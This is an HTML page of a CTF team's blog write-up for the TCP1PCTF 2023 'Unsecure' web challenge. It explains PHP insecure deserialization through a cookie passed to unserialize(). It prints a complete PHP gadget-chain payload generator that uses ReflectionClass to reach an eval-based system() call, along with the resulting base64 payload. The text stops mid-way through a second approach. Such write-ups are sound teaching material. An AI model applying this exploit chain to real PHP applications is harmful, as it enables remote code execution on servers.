@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Vicevirus">
+<meta name="description" content="This challenge was solved by one of our team member H0j3n. I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.
+In this challenge, we were given a source code zipped in a file called dist.zip
+Unzipped we will have the following files:
+Well, what is it? What kind of web is this?
+This seems like a simple PHP website with composer package manager installed." />
+<meta name="keywords" content=", WEB, TCP1PCTF, 2023" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://m53-ctf.github.io/posts/tcp1pctf2023-unsecure/" />
+
+
+    <title>
+        
+            [TCP1PCTF2023] Unsecure :: M53 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="[TCP1PCTF2023] Unsecure">
+<meta itemprop="description" content="This challenge was solved by one of our team member H0j3n. I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.
+In this challenge, we were given a source code zipped in a file called dist.zip
+Unzipped we will have the following files:
+Well, what is it? What kind of web is this?
+This seems like a simple PHP website with composer package manager installed."><meta itemprop="datePublished" content="2023-10-17T17:38:17+08:00" />
+<meta itemprop="dateModified" content="2023-10-17T17:38:17+08:00" />
+<meta itemprop="wordCount" content="1355"><meta itemprop="image" content="https://m53-ctf.github.io/"/>
+<meta itemprop="keywords" content="WEB,TCP1PCTF,2023," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://m53-ctf.github.io/"/>
+
+<meta name="twitter:title" content="[TCP1PCTF2023] Unsecure"/>
+<meta name="twitter:description" content="This challenge was solved by one of our team member H0j3n. I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.
+In this challenge, we were given a source code zipped in a file called dist.zip
+Unzipped we will have the following files:
+Well, what is it? What kind of web is this?
+This seems like a simple PHP website with composer package manager installed."/>
+
+
+
+    <meta property="og:title" content="[TCP1PCTF2023] Unsecure" />
+<meta property="og:description" content="This challenge was solved by one of our team member H0j3n. I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.
+In this challenge, we were given a source code zipped in a file called dist.zip
+Unzipped we will have the following files:
+Well, what is it? What kind of web is this?
+This seems like a simple PHP website with composer package manager installed." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://m53-ctf.github.io/posts/tcp1pctf2023-unsecure/" /><meta property="og:image" content="https://m53-ctf.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-17T17:38:17+08:00" />
+<meta property="article:modified_time" content="2023-10-17T17:38:17+08:00" /><meta property="og:site_name" content="M53" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-10-17 17:38:17 &#43;0800 &#43;08" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                ./M53</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/posts">Blog</a></li><li><a href="/tags">Tags</a></li><li><a href="/members">Members</a></li><li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://m53-ctf.github.io/posts/tcp1pctf2023-unsecure/">[TCP1PCTF2023] Unsecure</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>This challenge was solved by one of our team member <strong>H0j3n.</strong> I only managed to solve half of it due to time constraints and stuck on chaining the gadgets.</p>
+<p>In this challenge, we were given a source code zipped in a file called <code>dist.zip</code></p>
+<p><strong>Unzipped we will have the following files:</strong></p>
+<p><img src="/images/ctfs/tcp1pctf2023-unsecure/Untitled.png" alt="Untitled"></p>
+<p><strong>Well, what is it? What kind of web is this?</strong></p>
+<hr>
+<p>This seems like a simple PHP website with composer package manager installed. With bunch of PHP folders with the name <code>Gadgets</code></p>
+<p><strong>Let’s take a look at index.php first</strong></p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;vendor/autoload.php&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;cookie&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($_COOKIE[<span style="color:#e6db74">&#39;cookie&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($cookie);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Welcome to my web app!&#34;</span>;
+</span></span></code></pre></div><p><strong>Breakdown of what the code does:</strong></p>
+<ol>
+<li><strong><code>require(&quot;vendor/autoload.php&quot;);</code></strong>:
+<ul>
+<li>This line includes the PHP file <strong><code>vendor/autoload.php</code></strong> using the <strong><code>require</code></strong> statement. This typically suggests that the code is using Composer, a PHP package manager, and it&rsquo;s likely loading dependencies or classes defined in the <strong><code>vendor</code></strong> directory.</li>
+</ul>
+</li>
+<li><strong><code>if (isset($_COOKIE['cookie']))</code></strong>:
+<ul>
+<li>This conditional statement checks whether a cookie named <strong><code>'cookie'</code></strong> is set in the user&rsquo;s browser.</li>
+</ul>
+</li>
+<li>Cookie Decoding:
+<ul>
+<li>If the <strong><code>'cookie'</code></strong> cookie is set, the code proceeds to decode its value using <strong><code>base64_decode</code></strong>. The decoded value is stored in the <strong><code>$cookie</code></strong> variable.</li>
+</ul>
+</li>
+<li>Unserialization:
+<ul>
+<li>The code then attempts to unserialize the value of the <strong><code>$cookie</code></strong> variable using the <strong><code>unserialize()</code></strong> function. This function is used to restore an object or data structure from its serialized (string) representation.</li>
+<li>When <strong><code>unserialize()</code></strong> is used with untrusted data, an attacker can craft malicious serialized data that contains PHP code. When this data is deserialized, the PHP code within it can be executed on the server, leading to remote code execution. This can allow attackers to take control of the server or perform malicious actions.</li>
+</ul>
+</li>
+</ol>
+<p>Ohoo now we know that <strong><code>unserialize()</code></strong> is  vulnerable to <strong>insecure deserialization attack…</strong></p>
+<p><img src="https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" alt="https://media3.giphy.com/media/8fen5LSZcHQ5O/giphy.gif?cid=7941fdc67dc8qcix5mk94s5f2t3s52y427rf9hh99vrxih1e&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g"></p>
+<p>But wait.. remember all the <code>Gadgets</code> files that we’ve seen in the picture before this? It might be useful.</p>
+<p>Let’s take a look at them <code>(GadgetOne,GadgetTwo, GadgetThree)</code></p>
+<p><strong>GadgetOne (Adders.php)</strong></p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetOne</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Adders</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $x;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($x)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> $x;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_x</span>()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">x</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This PHP code defines a class named <strong><code>Adders</code></strong> within the <strong><code>GadgetOne</code></strong> namespace, which has a private property <strong><code>$x</code></strong> and methods to set and retrieve its value.</p>
+<p><strong>GadgetTwo (Echoers.php)</strong></p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetTwo</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Echoers</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $klass;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">klass</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_x</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This PHP code defines a class <strong><code>Echoers</code></strong> within the <strong><code>GadgetTwo</code></strong> namespace, and when an instance of this class is destroyed, it attempts to echo the value returned by the <strong><code>get_x()</code></strong> method of an object stored in its protected <strong><code>$klass</code></strong> property, assuming that such an object is present.</p>
+<p><strong>GadgetThree (Vuln.php)</strong></p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetThree</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Vuln</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $waf1;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> $waf2;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $waf3;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> $cmd;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __toString()
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">waf1</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;not x&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">waf2</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;not y&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">waf3</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;not z&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">eval</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This PHP code defines a class <strong><code>Vuln</code></strong> within the <strong><code>GadgetThree</code></strong> namespace, with public, protected, and private properties, and when the <strong><code>__toString()</code></strong> method is called, it checks some conditions and executes the code provided in the <strong><code>cmd</code></strong> property if those conditions are met, potentially allowing for arbitrary code execution.</p>
+<p><strong>Interesting <code>eval()</code> function here (RCE probably)</strong> 👀</p>
+<hr>
+<h2 id="so-what-do-we-do-now-with-all-this-stuff-that-we-have-found">So.. what do we do now with all this stuff that we have found?</h2>
+<hr>
+<p>Well, I am guessing that we have to  <code>chain</code> all these <code>Gadgets</code> , serialize it using **<code>serialize()</code><strong>and pass it to the <strong><code>unserialize()</code></strong> function inside the website in order to get the flag through <code>**RCE (Remote Code Execution)</code></strong></p>
+<p><strong>To make it simple:</strong></p>
+<ol>
+<li><strong>GadgetOne(Adders.php)</strong> stores value.</li>
+<li><strong>GadgetTwo(Echoers.php)</strong> echo the value given to it after the object is destroyed.</li>
+<li><strong>GadgetThree(Vuln.php)</strong> runs code execution <strong><code>eval()</code></strong></li>
+</ol>
+<p><strong>The flow of how it should be chained and how the payload can be generated:</strong></p>
+<ol>
+<li>Initialize <strong>GadgetThree(Vuln.php),</strong> match all the checks, pass in <code>system()</code> command to achieve RCE.</li>
+<li>Initialize <strong>GadgetOne(Adders.php)</strong> and pass the previously initialized <strong>GadgetThree</strong> to <strong>GadgetOne</strong>. <strong>GadgetOne</strong> will now store our <strong>GadgetThree</strong> object.</li>
+<li>The last part is to, initialize <strong>GadgetTwo(Echoers.php)</strong> and pass the previously initialized <strong>GadgetOne. GadgetTwo</strong> will now echo the things that we’ve stored in <strong>GadgetOne</strong> just now.</li>
+<li>Serialize them. <strong>(GadgetTwo)</strong></li>
+<li>Pass it to the <code>cookie</code> on the website in base64 encoded form.</li>
+<li>Profit ?????</li>
+</ol>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>GadgetThree(Vuln.php) → GadgetOne(Adders.php) → GadgetTwo(Echoers.php)</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<hr>
+<h2 id="so-how-can-we-craft-our-own-deserialization-payload">So, how can we craft our own deserialization payload?</h2>
+<p>To craft our own <code>deserialization</code>payload, we need a PHP testbed to <strong>make it work and run it first</strong>. In the final step, we will serialize the working code using <strong><code>serialize()</code></strong> function.</p>
+<h3 id="but-wait-theres-a-problem">But wait.. <strong>there’s a problem.</strong></h3>
+<p>As we can see in the <code>Gadgets</code> code previously, the code uses <code>protected</code> and <code>private</code> variables, which doesn’t allow direct tampering of variables from outside. By default, this prohibits us from passing in data and match all the checks inside the <code>Gadgets</code></p>
+<p><img src="https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" alt="https://media0.giphy.com/media/7bskJX6iodRno5mufQ/giphy.gif?cid=7941fdc6k8jy92ray65lzt82oa95a3pout46c8vcd3np0jpj&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g"></p>
+<hr>
+<h3 id="reflectionclass-to-the-rescue">ReflectionClass to the rescue!</h3>
+<p>In PHP, the <strong><code>ReflectionClass</code></strong> class is part of the Reflection API, which allows you to inspect and manipulate information about classes and their properties, methods, and other class-related details at runtime. Specifically, <strong><code>ReflectionClass</code></strong> is used to obtain information about a particular class. (It’s useful for dirty debugging I guess)</p>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Reference:</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p><a href="https://www.php.net/manual/en/class.reflectionclass.php">PHP: ReflectionClass - Manual</a></p>
+<p>With <code>**ReflectionClass</code>,** we could manipulate the <code>protected</code> and <code>private</code> variables during runtime to make the code work/run as it should.</p>
+<p>Now, we could easily match all the checks and pass in data to the <code>Gadgets</code> that we have just now.</p>
+<p><img src="https://media1.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif?cid=7941fdc6z27eahiipohy8gcgw3092x6btqk27b8yrt0mmpfs&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=g" alt="Yay! // Pls dont be traumatised by this picture"></p>
+<p>Yay! // Pls dont be traumatised by this picture</p>
+<p><strong>Author note:</strong> Tbh, I thought the payload generated from this  <strong><code>ReflectionClass</code></strong> method would only work locally. But after reading <strong>H0j3n’s</strong> brief writeup and understanding a ‘little bit’ about PHP deserialization, it actually works on the same environment (locally or remotely) if it were to be serialized.</p>
+<h1 id="solution">Solution</h1>
+<hr>
+<h2 id="approach-1-credit-to-h0j3n">Approach 1 (Credit to H0j3n)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;vendor/autoload.php&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$gadgetOne <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetOne\Adders</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>$gadgetTwo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetTwo\Echoers</span>();
+</span></span><span style="display:flex;"><span>$gadgetThree <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetThree\Vuln</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Setup GadgeThree == Setup Vuln with RCE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// __toString() == Need to trigger this with echo (Can only be found in Echoers.php)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// get an Vuln class instance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$vuln <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetThree\Vuln</span>();
+</span></span><span style="display:flex;"><span>$reflection <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\ReflectionClass</span>($gadgetThree);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;waf1&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($vuln, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;waf2&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($vuln, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;waf3&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($vuln, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;cmd&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($vuln, <span style="color:#e6db74">&#34;system(&#39;cat *.txt&#39;);&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Setup GadgetOne == set x = Vuln()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// __construct($x) == Can easily set x = Vuln()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// get a Adders class instance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$adders <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetOne\Adders</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>$reflection <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\ReflectionClass</span>($gadgetOne);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;x&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($adders, $vuln);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Setup GadgetTwo
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// __destruct() == Trigger if exception or exit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// We can try to set klass with GadgetOne value contains our RCE payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// get Echoers class instance
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$echoers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GadgetTwo\Echoers</span>();
+</span></span><span style="display:flex;"><span>$reflection <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\ReflectionClass</span>($gadgetTwo);
+</span></span><span style="display:flex;"><span>$property <span style="color:#f92672">=</span> $reflection<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#39;klass&#39;</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>$property<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setValue</span>($echoers, $adders);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$serialized <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($echoers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>($serialized);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Explanation from H0j3n:</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<ul>
+<li><code>__construct()</code> in GadgetOne = Use this to set <code>$x</code> to <code>Vuln()</code> with RCE + bypass the <code>waf1,waf2,waf3</code></li>
+<li><code>__destruct()</code> in GadgetTwo = Inside here got echo which will be use to trigger <code>__toString()</code>. But to trigger <code>__destruct()</code>, from what I know we need to make it exit/exception which we can set the <code>$klass</code> with the object of GadgetOne itself.</li>
+</ul>
+<p><strong>Useful functions in <code>ReflectionClass</code> that make this method work:</strong></p>
+<p><strong>setAccessible() →</strong> Make the property/variable accessible.</p>
+<p><strong>setValue() →</strong> Set the value for the property/variable.</p>
+<p><strong>Running the code above, will generate the payload in base64-encoded form:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0</span><span style="color:#f92672">=</span>
+</span></span></code></pre></div><hr>
+<h2 id="approach-2-credit-to-heapcreate">Approach 2 (credit to HeapCreate)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetOne</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Adders</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> $x;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> __construct($x) {
